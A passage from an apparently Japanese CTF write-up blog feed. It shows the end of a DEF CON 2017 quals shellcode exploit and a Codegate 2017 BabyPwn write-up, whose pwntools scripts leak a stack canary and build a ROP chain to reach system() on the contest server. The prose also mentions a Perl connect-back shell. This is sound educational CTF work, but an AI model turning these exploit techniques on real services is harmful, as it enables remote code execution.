<span id="cb22-49"><a href="https://blog.myon.info/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb22-49" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb22-50"><a href="https://blog.myon.info/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb22-50" aria-hidden="true" tabindex="-1"></a><span class="cf">for</span> s <span class="kw">in</span> shellcode:</span>
<span id="cb22-51"><a href="https://blog.myon.info/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb22-51" aria-hidden="true" tabindex="-1"></a>    f <span class="op">=</span> struct.unpack(<span class="st">'!f'</span>, (s <span class="op">+</span> <span class="st">'</span><span class="ch">\x68</span><span class="st">'</span>)[::<span class="op">-</span><span class="dv">1</span>])[<span class="dv">0</span>]</span>
<span id="cb22-52"><a href="https://blog.myon.info/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb22-52" aria-hidden="true" tabindex="-1"></a>    s <span class="op">=</span> <span class="st">'</span><span class="sc">%.64lg</span><span class="st">'</span> <span class="op">%</span> f</span>
<span id="cb22-53"><a href="https://blog.myon.info/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb22-53" aria-hidden="true" tabindex="-1"></a>    <span class="bu">print</span> s</span>
<span id="cb22-54"><a href="https://blog.myon.info/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb22-54" aria-hidden="true" tabindex="-1"></a>    r.sendline(s)</span>
<span id="cb22-55"><a href="https://blog.myon.info/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb22-55" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb22-56"><a href="https://blog.myon.info/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb22-56" aria-hidden="true" tabindex="-1"></a><span class="cf">for</span> i <span class="kw">in</span> <span class="bu">range</span>(<span class="dv">0</span>, <span class="dv">25</span> <span class="op">-</span> <span class="bu">len</span>(shellcode)):</span>
<span id="cb22-57"><a href="https://blog.myon.info/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb22-57" aria-hidden="true" tabindex="-1"></a>    r.sendline(<span class="st">'0'</span>)</span>
<span id="cb22-58"><a href="https://blog.myon.info/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb22-58" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb22-59"><a href="https://blog.myon.info/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb22-59" aria-hidden="true" tabindex="-1"></a>pause(<span class="dv">1</span>)</span>
<span id="cb22-60"><a href="https://blog.myon.info/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb22-60" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb22-61"><a href="https://blog.myon.info/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb22-61" aria-hidden="true" tabindex="-1"></a>r.clean()</span>
<span id="cb22-62"><a href="https://blog.myon.info/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb22-62" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb22-63"><a href="https://blog.myon.info/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb22-63" aria-hidden="true" tabindex="-1"></a>r.sendline(<span class="st">'flag'</span>.ljust(<span class="bn">0x7f</span>, <span class="st">'</span><span class="ch">\x00</span><span class="st">'</span>))</span>
<span id="cb22-64"><a href="https://blog.myon.info/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb22-64" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb22-65"><a href="https://blog.myon.info/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb22-65" aria-hidden="true" tabindex="-1"></a>r.interactive()</span></code></pre></div>
<pre><code>$ ./exploit.py remote
[+] Opening connection to floater_f128edcd6c7ecd2ceac15235749c1565.quals.shallweplayaga.me on port 754: Done
[*] send shellcode
8709413465159098708262912
7260827546538835038961664
7538266577407426695266304
2726026692719540090961920
7933764770347759481913344
7933764770347759481913344
7933764770347759481913344
5440912704940064219594752
7878277540634793454075904
9351655306829370457325568
9300889867138521771278336
7940848320072063949733888
2460541152010712224104448
5440912704940064219594752
7538266577407426695266304
8709413465159098708262912
7349374223935650100412416
7260827546538835038961664
5440912704940064219594752
7349374223935650100412416
7260827546538835038961664
7291227780772308380024832
7538266577407426695266304
5440912704940064219594752
[+] Waiting: Done
[*] Switching to interactive mode
The flag is: l00ks_l1k3_w3_g0t_0ur53lv35_4_fl04t3r
\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00flag\x00\x00\x00\x00[*] Got EOF while reading in interactive
$ 
[*] Closed connection to floater_f128edcd6c7ecd2ceac15235749c1565.quals.shallweplayaga.me port 754</code></pre>
<p>よくわかっていなかった浮動小数点値の扱い方も知ることができてよかった.</p>
<h2 id="参考リンク">参考リンク</h2>
<ul>
<li><a href="http://warabanshi.hatenablog.com/entry/2014/05/21/001419">原書で学ぶ64bitアセンブラ入門（6） - わらばんし仄聞記</a></li>
<li><a href="http://www.intel.com/content/www/us/en/architecture-and-technology/64-ia-32-architectures-software-developer-instruction-set-reference-manual-325383.html">Intel® 64 and IA-32 Architectures Software Developer’s Manual Volume 2 (2A, 2B, 2C &amp; 2D): Instruction Set Reference, A-Z</a></li>
<li><a href="http://inaz2.hatenablog.com/entry/2014/03/13/013056">Linux x86用のシェルコードを書いてみる - ももいろテクノロジー</a></li>
<li><a href="http://stackoverflow.com/a/1592362">python - Convert hex to float - Stack Overflow</a></li>
</ul>
<section class="footnotes footnotes-end-of-document" role="doc-endnotes">
<hr />
<ol>
<li id="fn1" role="doc-endnote"><p>これの一種かな? <a href="https://gcc.gnu.org/onlinedocs/gcc-5.4.0/gcc/Function-Attributes.html">Function Attributes - Using the GNU Compiler Collection (GCC)</a><a href="https://blog.myon.info/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#fnref1" class="footnote-back" role="doc-backlink">↩︎</a></p></li>
</ol>
</section>]]></summary>
</entry>
<entry>
    <title>Codegate 2017 CTF prequals writeup</title>
    <link href="https://blog.myon.info/entry/2017/02/11/codegate-2017-prequals-writeup/index.html" />
    <id>https://blog.myon.info/entry/2017/02/11/codegate-2017-prequals-writeup/index.html</id>
    <published>2017-02-11T12:20:00Z</published>
    <updated>2017-02-11T12:20:00Z</updated>
    <summary type="html"><![CDATA[<p><a href="http://ctf.codegate.org/">Codegate 2017 CTF</a> の Prequalification Round に一人チーム poepoe で参加. 305 points で 78 位(General)でした.</p>
<p>pwn 過去問でもよく見かける Codegate 関連の CTF というだけあって, 実行ファイル解析系の問題が多めだった感じ. 正答者数が増えると問題の得点が下がっていくシステムもあったりで面白かった.</p>
<!--more-->
<h2 id="mic-check-50pt">1. Mic Check <small>(50pt)</small></h2>
<p>いわゆるサービス問題. 問題文に得点のシステム等の説明とともに Flag が書いてある.<br />
<strong>real flag is in brackets</strong> とあるように, 送信する Flag は <code>{}</code> 内の文字列だけなので注意.</p>
<blockquote>
<p>Mic Check
one two~ one two~</p>
<p>First Point : 500<br />
Minimal Point : 50<br />
Minus per one solver : -5</p>
<p>Here is Flag~ FLAG{Welcome_to_codegate2017}</p>
<p>real flag is in brackets.</p>
</blockquote>
<h2 id="babypwn-50pt">2. BabyPwn <small>(50pt)</small></h2>
<p>32bit の ELF.<br />
fork-server 型などと呼ばれているタイプの問題で, 実行すると <code>argv[1]</code> に渡した数値または <code>8181</code> ポートで接続を待つような感じになっていた.</p>
<pre><code>$ file babypwn
babypwn: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=79d683df4838066af61f58fc7025deb99e6bab3d, stripped

$ checksec babypwn
[*] '/tmp/babypwn'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE</code></pre>
<p>対象のアドレス/ポートに接続すると, 次のようなメニューが表示される. 1は入力した文字列をそのまま表示, 2は入力した文字列を逆順で表示するというものだった.</p>
<pre><code>$ nc localhost 8181
▒▒▒▒▒▒▒C▒O▒D▒E▒G▒A▒T▒E▒2▒0▒1▒7▒▒▒▒▒▒▒
▒▒▒▒▒▒▒B▒A▒B▒Y▒P▒W▒N▒!▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
▒▒▒▒▒▒▒G▒O▒O▒D▒L▒U▒C▒K▒~▒!▒▒▒▒▒▒▒▒▒▒▒
===============================
1. Echo
2. Reverse Echo
3. Exit
===============================
Select menu &gt; </code></pre>
<p>接続後の主な処理は <code>0x08048a71</code> の関数にあった. 1の処理を追っていくと, 入力した文字列を入れるために確保した領域(0x28 byte)に <code>recv()</code> で <code>0x64</code> byte も読み込んでいるため stack buffer overflow が起こせる. しかも, 次の入力された文字列を返す処理では, <code>send()</code> で <code>strlen(buf)</code> 分の文字列を送信しているため, stack の情報をリークさせることが可能なのがわかる.</p>
<p>そこで, 次のような攻撃を行う.<br />
まず, stack canary をリークさせる. canary は <code>0x5082ab00</code> のような下位1 byte が <code>0x00</code> なランダムな値なので, 0x28 +1文字を書き込んで <code>strlen()</code> のチェックを回避し, 送られてくる文字列の0x29~0x2c文字目を処理することで得られる.</p>
<div class="sourceCode" id="cb3"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb3-1"><a href="https://blog.myon.info/entry/2017/02/11/codegate-2017-prequals-writeup/#cb3-1" aria-hidden="true" tabindex="-1"></a><span class="co">#!/usr/bin/env python2</span></span>
<span id="cb3-2"><a href="https://blog.myon.info/entry/2017/02/11/codegate-2017-prequals-writeup/#cb3-2" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb3-3"><a href="https://blog.myon.info/entry/2017/02/11/codegate-2017-prequals-writeup/#cb3-3" aria-hidden="true" tabindex="-1"></a><span class="im">from</span> pwn <span class="im">import</span> <span class="op">*</span></span>
<span id="cb3-4"><a href="https://blog.myon.info/entry/2017/02/11/codegate-2017-prequals-writeup/#cb3-4" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb3-5"><a href="https://blog.myon.info/entry/2017/02/11/codegate-2017-prequals-writeup/#cb3-5" aria-hidden="true" tabindex="-1"></a>r <span class="op">=</span> remote(<span class="st">'localhost'</span>, <span class="dv">8181</span>)</span>
<span id="cb3-6"><a href="https://blog.myon.info/entry/2017/02/11/codegate-2017-prequals-writeup/#cb3-6" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb3-7"><a href="https://blog.myon.info/entry/2017/02/11/codegate-2017-prequals-writeup/#cb3-7" aria-hidden="true" tabindex="-1"></a><span class="kw">def</span> echo(s):</span>
<span id="cb3-8"><a href="https://blog.myon.info/entry/2017/02/11/codegate-2017-prequals-writeup/#cb3-8" aria-hidden="true" tabindex="-1"></a>    r.recvuntil(<span class="st">'Select menu &gt; '</span>)</span>
<span id="cb3-9"><a href="https://blog.myon.info/entry/2017/02/11/codegate-2017-prequals-writeup/#cb3-9" aria-hidden="true" tabindex="-1"></a>    r.sendline(<span class="st">'1'</span>)</span>
<span id="cb3-10"><a href="https://blog.myon.info/entry/2017/02/11/codegate-2017-prequals-writeup/#cb3-10" aria-hidden="true" tabindex="-1"></a>    r.recvuntil(<span class="st">'Input Your Message : '</span>)</span>
<span id="cb3-11"><a href="https://blog.myon.info/entry/2017/02/11/codegate-2017-prequals-writeup/#cb3-11" aria-hidden="true" tabindex="-1"></a>    r.send(s)</span>
<span id="cb3-12"><a href="https://blog.myon.info/entry/2017/02/11/codegate-2017-prequals-writeup/#cb3-12" aria-hidden="true" tabindex="-1"></a>    ret <span class="op">=</span> r.recvuntil(<span class="st">'</span><span class="ch">\12</span><span class="st">='</span>)</span>
<span id="cb3-13"><a href="https://blog.myon.info/entry/2017/02/11/codegate-2017-prequals-writeup/#cb3-13" aria-hidden="true" tabindex="-1"></a>    <span class="cf">return</span> ret[:<span class="op">-</span><span class="dv">2</span>]</span>
<span id="cb3-14"><a href="https://blog.myon.info/entry/2017/02/11/codegate-2017-prequals-writeup/#cb3-14" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb3-15"><a href="https://blog.myon.info/entry/2017/02/11/codegate-2017-prequals-writeup/#cb3-15" aria-hidden="true" tabindex="-1"></a>buffer_size <span class="op">=</span> <span class="bn">0x28</span></span>
<span id="cb3-16"><a href="https://blog.myon.info/entry/2017/02/11/codegate-2017-prequals-writeup/#cb3-16" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb3-17"><a href="https://blog.myon.info/entry/2017/02/11/codegate-2017-prequals-writeup/#cb3-17" aria-hidden="true" tabindex="-1"></a>ret <span class="op">=</span> echo(<span class="st">'A'</span> <span class="op">*</span> (buffer_size <span class="op">+</span> <span class="dv">1</span>))</span>
<span id="cb3-18"><a href="https://blog.myon.info/entry/2017/02/11/codegate-2017-prequals-writeup/#cb3-18" aria-hidden="true" tabindex="-1"></a>canary <span class="op">=</span> u32(ret[buffer_size:buffer_size <span class="op">+</span> <span class="dv">5</span>]) <span class="op">&amp;</span> <span class="bn">0xffffff00</span></span>
<span id="cb3-19"><a href="https://blog.myon.info/entry/2017/02/11/codegate-2017-prequals-writeup/#cb3-19" aria-hidden="true" tabindex="-1"></a>log.info(<span class="st">'leaked canary: 0x</span><span class="sc">%x</span><span class="st">'</span> <span class="op">%</span> canary)</span>
<span id="cb3-20"><a href="https://blog.myon.info/entry/2017/02/11/codegate-2017-prequals-writeup/#cb3-20" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb3-21"><a href="https://blog.myon.info/entry/2017/02/11/codegate-2017-prequals-writeup/#cb3-21" aria-hidden="true" tabindex="-1"></a>r.close()</span></code></pre></div>
<pre><code>$ ./exploit.py
[+] Opening connection to localhost on port 8181: Done
[*] leaked canary: 0x5082ab00
[*] Closed connection to localhost port 8181</code></pre>
<p>次に, リークさせた canary を使って bof のチェックを回避しつつ, リターンアドレスを書き換えて ROP につなげる.<br />
調べていくと <code>0x08048c3b</code> にこんな感じの関数(があった痕跡?)があるので, <code>system@plt()</code> を呼び出せば任意のシェルコマンドを実行できそうなのがわかる.</p>
<pre><code>[0x08048710]&gt; pd 14 @ 0x08048c3b
            0x08048c3b      push ebp
            0x08048c3c      mov ebp, esp
            0x08048c3e      sub esp, 0x28
            0x08048c41      mov eax, dword gs:[0x14]
            0x08048c47      mov dword [ebp - 0xc], eax
            0x08048c4a      xor eax, eax
            0x08048c4c      mov dword [esp], str.echo__not_easy_to_see._
            0x08048c53      call sym.imp.system
            0x08048c58      mov eax, dword [ebp - 0xc]
            0x08048c5b      xor eax, dword gs:[0x14]
        ,=&lt; 0x08048c62      je 0x8048c69
        |   0x08048c64      call sym.imp.__stack_chk_fail
        `-&gt; 0x08048c69      leave
            0x08048c6a      ret</code></pre>
<p>しかし, これは fork-server 型なので <code>system("/bin/sh")</code> を呼んでも意味がない<a href="https://blog.myon.info/entry/2017/02/11/codegate-2017-prequals-writeup/#fn1" class="footnote-ref" id="fnref1" role="doc-noteref"><sup>1</sup></a>. そこで, Linux 環境ならほぼ確実に入っているだろう Perl の connect-back shell を起動するワンライナーを使うことにした.</p>
<p>また, <code>system()</code> の引数に渡す文字列は, 木曜に解いた <a href="http://shell-storm.org/repo/CTF/CSAW-2013/Exploitation/CSAW-Diary-300/">CSAW CTF Qualification Round 2013: Exploitation3</a> (<a href="https://gist.github.com/Tosainu/5e0a1764c020a7e5b251b64b48b1468c">書いたスクリプト</a>)と同じような手法を使って送り込んだ.<br />
ROP が発動する段階ではまだ通信が close されていないことを利用し, まず <code>recv(fd, addr_bss, 0x100, 0)</code> を呼んで <code>.bss</code> セクションに実行したいシェルコマンドを書き込み, その後 <code>system(addr_bss)</code> につなげて送ったコマンドを実行させる.</p>
<p>実際に作成したスクリプトと実行結果は次の通り. 作業している環境が 無線 LAN ルータ等の NAT の下にある場合は port forwarding の設定をしておくのも忘れずに.</p>
<div class="sourceCode" id="cb6"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb6-1"><a href="https://blog.myon.info/entry/2017/02/11/codegate-2017-prequals-writeup/#cb6-1" aria-hidden="true" tabindex="-1"></a><span class="co">#!/usr/bin/env python2</span></span>
<span id="cb6-2"><a href="https://blog.myon.info/entry/2017/02/11/codegate-2017-prequals-writeup/#cb6-2" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb6-3"><a href="https://blog.myon.info/entry/2017/02/11/codegate-2017-prequals-writeup/#cb6-3" aria-hidden="true" tabindex="-1"></a><span class="im">from</span> pwn <span class="im">import</span> <span class="op">*</span></span>
<span id="cb6-4"><a href="https://blog.myon.info/entry/2017/02/11/codegate-2017-prequals-writeup/#cb6-4" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb6-5"><a href="https://blog.myon.info/entry/2017/02/11/codegate-2017-prequals-writeup/#cb6-5" aria-hidden="true" tabindex="-1"></a><span class="co"># $ objdump -M intel -j .plt -d babypwn</span></span>
<span id="cb6-6"><a href="https://blog.myon.info/entry/2017/02/11/codegate-2017-prequals-writeup/#cb6-6" aria-hidden="true" tabindex="-1"></a><span class="co"># (...)</span></span>
<span id="cb6-7"><a href="https://blog.myon.info/entry/2017/02/11/codegate-2017-prequals-writeup/#cb6-7" aria-hidden="true" tabindex="-1"></a><span class="co"># 08048620 &lt;system@plt&gt;:</span></span>
<span id="cb6-8"><a href="https://blog.myon.info/entry/2017/02/11/codegate-2017-prequals-writeup/#cb6-8" aria-hidden="true" tabindex="-1"></a><span class="co">#  8048620:	ff 25 2c b0 04 08    	jmp    DWORD PTR ds:0x804b02c</span></span>
<span id="cb6-9"><a href="https://blog.myon.info/entry/2017/02/11/codegate-2017-prequals-writeup/#cb6-9" aria-hidden="true" tabindex="-1"></a><span class="co">#  8048626:	68 40 00 00 00       	push   0x40</span></span>
<span id="cb6-10"><a href="https://blog.myon.info/entry/2017/02/11/codegate-2017-prequals-writeup/#cb6-10" aria-hidden="true" tabindex="-1"></a><span class="co">#  804862b:	e9 60 ff ff ff       	jmp    8048590 &lt;setsockopt@plt-0x10&gt;</span></span>
<span id="cb6-11"><a href="https://blog.myon.info/entry/2017/02/11/codegate-2017-prequals-writeup/#cb6-11" aria-hidden="true" tabindex="-1"></a><span class="co"># (...)</span></span>
<span id="cb6-12"><a href="https://blog.myon.info/entry/2017/02/11/codegate-2017-prequals-writeup/#cb6-12" aria-hidden="true" tabindex="-1"></a><span class="co"># 080486e0 &lt;recv@plt&gt;:</span></span>
<span id="cb6-13"><a href="https://blog.myon.info/entry/2017/02/11/codegate-2017-prequals-writeup/#cb6-13" aria-hidden="true" tabindex="-1"></a><span class="co">#  80486e0:	ff 25 5c b0 04 08    	jmp    DWORD PTR ds:0x804b05c</span></span>
<span id="cb6-14"><a href="https://blog.myon.info/entry/2017/02/11/codegate-2017-prequals-writeup/#cb6-14" aria-hidden="true" tabindex="-1"></a><span class="co">#  80486e6:	68 a0 00 00 00       	push   0xa0</span></span>
<span id="cb6-15"><a href="https://blog.myon.info/entry/2017/02/11/codegate-2017-prequals-writeup/#cb6-15" aria-hidden="true" tabindex="-1"></a><span class="co">#  80486eb:	e9 a0 fe ff ff       	jmp    8048590 &lt;setsockopt@plt-0x10&gt;</span></span>
<span id="cb6-16"><a href="https://blog.myon.info/entry/2017/02/11/codegate-2017-prequals-writeup/#cb6-16" aria-hidden="true" tabindex="-1"></a>addr_system_plt <span class="op">=</span> <span class="bn">0x8048620</span></span>
<span id="cb6-17"><a href="https://blog.myon.info/entry/2017/02/11/codegate-2017-prequals-writeup/#cb6-17" aria-hidden="true" tabindex="-1"></a>addr_recv_plt   <span class="op">=</span> <span class="bn">0x80486e0</span></span>
<span id="cb6-18"><a href="https://blog.myon.info/entry/2017/02/11/codegate-2017-prequals-writeup/#cb6-18" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb6-19"><a href="https://blog.myon.info/entry/2017/02/11/codegate-2017-prequals-writeup/#cb6-19" aria-hidden="true" tabindex="-1"></a><span class="co"># $ readelf -S babypwn | grep .bss</span></span>
<span id="cb6-20"><a href="https://blog.myon.info/entry/2017/02/11/codegate-2017-prequals-writeup/#cb6-20" aria-hidden="true" tabindex="-1"></a><span class="co">#   [25] .bss              NOBITS          0804b1b4 0021b4 00000c 00  WA  0   0  4</span></span>
<span id="cb6-21"><a href="https://blog.myon.info/entry/2017/02/11/codegate-2017-prequals-writeup/#cb6-21" aria-hidden="true" tabindex="-1"></a>addr_bss <span class="op">=</span> <span class="bn">0x804b1b4</span></span>
<span id="cb6-22"><a href="https://blog.myon.info/entry/2017/02/11/codegate-2017-prequals-writeup/#cb6-22" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb6-23"><a href="https://blog.myon.info/entry/2017/02/11/codegate-2017-prequals-writeup/#cb6-23" aria-hidden="true" tabindex="-1"></a>buffer_size <span class="op">=</span> <span class="bn">0x28</span></span>
<span id="cb6-24"><a href="https://blog.myon.info/entry/2017/02/11/codegate-2017-prequals-writeup/#cb6-24" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb6-25"><a href="https://blog.myon.info/entry/2017/02/11/codegate-2017-prequals-writeup/#cb6-25" aria-hidden="true" tabindex="-1"></a>socket_fd <span class="op">=</span> <span class="dv">4</span></span>
<span id="cb6-26"><a href="https://blog.myon.info/entry/2017/02/11/codegate-2017-prequals-writeup/#cb6-26" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb6-27"><a href="https://blog.myon.info/entry/2017/02/11/codegate-2017-prequals-writeup/#cb6-27" aria-hidden="true" tabindex="-1"></a><span class="co"># r = remote('localhost', 8181)</span></span>
<span id="cb6-28"><a href="https://blog.myon.info/entry/2017/02/11/codegate-2017-prequals-writeup/#cb6-28" aria-hidden="true" tabindex="-1"></a>r <span class="op">=</span> remote(<span class="st">'110.10.212.130'</span>, <span class="dv">8888</span>)</span>
<span id="cb6-29"><a href="https://blog.myon.info/entry/2017/02/11/codegate-2017-prequals-writeup/#cb6-29" aria-hidden="true" tabindex="-1"></a><span class="co"># r = remote('110.10.212.130', 8889)</span></span>
<span id="cb6-30"><a href="https://blog.myon.info/entry/2017/02/11/codegate-2017-prequals-writeup/#cb6-30" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb6-31"><a href="https://blog.myon.info/entry/2017/02/11/codegate-2017-prequals-writeup/#cb6-31" aria-hidden="true" tabindex="-1"></a><span class="kw">def</span> echo(s):</span>
<span id="cb6-32"><a href="https://blog.myon.info/entry/2017/02/11/codegate-2017-prequals-writeup/#cb6-32" aria-hidden="true" tabindex="-1"></a>    r.recvuntil(<span class="st">'Select menu &gt; '</span>)</span>
<span id="cb6-33"><a href="https://blog.myon.info/entry/2017/02/11/codegate-2017-prequals-writeup/#cb6-33" aria-hidden="true" tabindex="-1"></a>    r.sendline(<span class="st">'1'</span>)</span>
<span id="cb6-34"><a href="https://blog.myon.info/entry/2017/02/11/codegate-2017-prequals-writeup/#cb6-34" aria-hidden="true" tabindex="-1"></a>    r.recvuntil(<span class="st">'Input Your Message : '</span>)</span>
<span id="cb6-35"><a href="https://blog.myon.info/entry/2017/02/11/codegate-2017-prequals-writeup/#cb6-35" aria-hidden="true" tabindex="-1"></a>    r.send(s)</span>
<span id="cb6-36"><a href="https://blog.myon.info/entry/2017/02/11/codegate-2017-prequals-writeup/#cb6-36" aria-hidden="true" tabindex="-1"></a>    ret <span class="op">=</span> r.recvuntil(<span class="st">'</span><span class="ch">\12</span><span class="st">='</span>)</span>
<span id="cb6-37"><a href="https://blog.myon.info/entry/2017/02/11/codegate-2017-prequals-writeup/#cb6-37" aria-hidden="true" tabindex="-1"></a>    <span class="cf">return</span> ret[:<span class="op">-</span><span class="dv">2</span>]</span>
<span id="cb6-38"><a href="https://blog.myon.info/entry/2017/02/11/codegate-2017-prequals-writeup/#cb6-38" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb6-39"><a href="https://blog.myon.info/entry/2017/02/11/codegate-2017-prequals-writeup/#cb6-39" aria-hidden="true" tabindex="-1"></a><span class="kw">def</span> reverse_echo(s):</span>
<span id="cb6-40"><a href="https://blog.myon.info/entry/2017/02/11/codegate-2017-prequals-writeup/#cb6-40" aria-hidden="true" tabindex="-1"></a>    r.recvuntil(<span class="st">'Select menu &gt; '</span>)</span>
<span id="cb6-41"><a href="https://blog.myon.info/entry/2017/02/11/codegate-2017-prequals-writeup/#cb6-41" aria-hidden="true" tabindex="-1"></a>    r.sendline(<span class="st">'2'</span>)</span>
<span id="cb6-42"><a href="https://blog.myon.info/entry/2017/02/11/codegate-2017-prequals-writeup/#cb6-42" aria-hidden="true" tabindex="-1"></a>    r.recvuntil(<span class="st">'Input Your Message : '</span>)</span>
<span id="cb6-43"><a href="https://blog.myon.info/entry/2017/02/11/codegate-2017-prequals-writeup/#cb6-43" aria-hidden="true" tabindex="-1"></a>    r.send(s)</span>
<span id="cb6-44"><a href="https://blog.myon.info/entry/2017/02/11/codegate-2017-prequals-writeup/#cb6-44" aria-hidden="true" tabindex="-1"></a>    ret <span class="op">=</span> r.recvuntil(<span class="st">'</span><span class="ch">\12</span><span class="st">='</span>)</span>
<span id="cb6-45"><a href="https://blog.myon.info/entry/2017/02/11/codegate-2017-prequals-writeup/#cb6-45" aria-hidden="true" tabindex="-1"></a>    <span class="cf">return</span> ret[:<span class="op">-</span><span class="dv">2</span>]</span>
<span id="cb6-46"><a href="https://blog.myon.info/entry/2017/02/11/codegate-2017-prequals-writeup/#cb6-46" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb6-47"><a href="https://blog.myon.info/entry/2017/02/11/codegate-2017-prequals-writeup/#cb6-47" aria-hidden="true" tabindex="-1"></a><span class="kw">def</span> exit_app():</span>
<span id="cb6-48"><a href="https://blog.myon.info/entry/2017/02/11/codegate-2017-prequals-writeup/#cb6-48" aria-hidden="true" tabindex="-1"></a>    r.recvuntil(<span class="st">'Select menu &gt; '</span>)</span>
<span id="cb6-49"><a href="https://blog.myon.info/entry/2017/02/11/codegate-2017-prequals-writeup/#cb6-49" aria-hidden="true" tabindex="-1"></a>    r.sendline(<span class="st">'3'</span>)</span>
<span id="cb6-50"><a href="https://blog.myon.info/entry/2017/02/11/codegate-2017-prequals-writeup/#cb6-50" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb6-51"><a href="https://blog.myon.info/entry/2017/02/11/codegate-2017-prequals-writeup/#cb6-51" aria-hidden="true" tabindex="-1"></a><span class="co"># leak canary</span></span>
<span id="cb6-52"><a href="https://blog.myon.info/entry/2017/02/11/codegate-2017-prequals-writeup/#cb6-52" aria-hidden="true" tabindex="-1"></a>ret <span class="op">=</span> echo(<span class="st">'A'</span> <span class="op">*</span> (buffer_size <span class="op">+</span> <span class="dv">1</span>))</span>
<span id="cb6-53"><a href="https://blog.myon.info/entry/2017/02/11/codegate-2017-prequals-writeup/#cb6-53" aria-hidden="true" tabindex="-1"></a>canary <span class="op">=</span> u32(ret[buffer_size:buffer_size <span class="op">+</span> <span class="dv">5</span>]) <span class="op">&amp;</span> <span class="bn">0xffffff00</span></span>
<span id="cb6-54"><a href="https://blog.myon.info/entry/2017/02/11/codegate-2017-prequals-writeup/#cb6-54" aria-hidden="true" tabindex="-1"></a>log.info(<span class="st">'leaked canary: 0x</span><span class="sc">%x</span><span class="st">'</span> <span class="op">%</span> canary)</span>
<span id="cb6-55"><a href="https://blog.myon.info/entry/2017/02/11/codegate-2017-prequals-writeup/#cb6-55" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb6-56"><a href="https://blog.myon.info/entry/2017/02/11/codegate-2017-prequals-writeup/#cb6-56" aria-hidden="true" tabindex="-1"></a><span class="co"># send ROP</span></span>
<span id="cb6-57"><a href="https://blog.myon.info/entry/2017/02/11/codegate-2017-prequals-writeup/#cb6-57" aria-hidden="true" tabindex="-1"></a>payload <span class="op">=</span> <span class="st">''</span></span>
<span id="cb6-58"><a href="https://blog.myon.info/entry/2017/02/11/codegate-2017-prequals-writeup/#cb6-58" aria-hidden="true" tabindex="-1"></a>payload <span class="op">+=</span> <span class="st">'A'</span> <span class="op">*</span> buffer_size</span>
<span id="cb6-59"><a href="https://blog.myon.info/entry/2017/02/11/codegate-2017-prequals-writeup/#cb6-59" aria-hidden="true" tabindex="-1"></a>payload <span class="op">+=</span> p32(canary)</span>
<span id="cb6-60"><a href="https://blog.myon.info/entry/2017/02/11/codegate-2017-prequals-writeup/#cb6-60" aria-hidden="true" tabindex="-1"></a>payload <span class="op">+=</span> <span class="st">'BBBB'</span>                   <span class="co"># 0x8048b83:        pop    ebx</span></span>
<span id="cb6-61"><a href="https://blog.myon.info/entry/2017/02/11/codegate-2017-prequals-writeup/#cb6-61" aria-hidden="true" tabindex="-1"></a>payload <span class="op">+=</span> <span class="st">'BBBB'</span>                   <span class="co"># 0x8048b84:        pop    edi</span></span>
<span id="cb6-62"><a href="https://blog.myon.info/entry/2017/02/11/codegate-2017-prequals-writeup/#cb6-62" aria-hidden="true" tabindex="-1"></a>payload <span class="op">+=</span> p32(addr_bss <span class="op">+</span> <span class="bn">0x800</span>)    <span class="co"># 0x8048b85:        pop    ebp</span></span>
<span id="cb6-63"><a href="https://blog.myon.info/entry/2017/02/11/codegate-2017-prequals-writeup/#cb6-63" aria-hidden="true" tabindex="-1"></a>payload <span class="op">+=</span> p32(addr_recv_plt)       <span class="co"># recv(fd, addr_bss, 0x100, 0)</span></span>
